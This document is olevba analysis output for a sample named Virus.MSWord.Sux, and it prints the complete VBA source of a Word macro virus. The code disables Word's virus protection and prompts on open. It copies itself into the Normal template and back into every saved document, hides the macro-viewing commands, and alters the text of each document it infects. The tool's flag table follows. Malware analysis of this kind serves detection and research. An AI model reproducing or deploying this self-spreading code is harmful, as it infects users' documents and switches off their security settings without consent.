olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sux
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sux - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Skeleton.bas 
in file: Virus.MSWord.Sux - OLE stream: 'Macros/VBA/Skeleton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Err
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = False
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Skeleton", wdOrganizerObjectProjectItems
    Exit Sub
Err:
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Skeleton", wdOrganizerObjectProjectItems
End Sub
Sub FileSaveAs()
On Error GoTo Err
    Dialogs(wdDialogFileSaveAs).Show
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Skeleton", wdOrganizerObjectProjectItems
Err:
    Call Payload
    ActiveDocument.Save
End Sub
Sub FileSave()
On Error GoTo Err
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Skeleton", wdOrganizerObjectProjectItems
Err:
    Call Payload
    ActiveDocument.Save
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
Sub Payload()
    ActiveDocument.Words.Last = "AUBG_SUX"
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

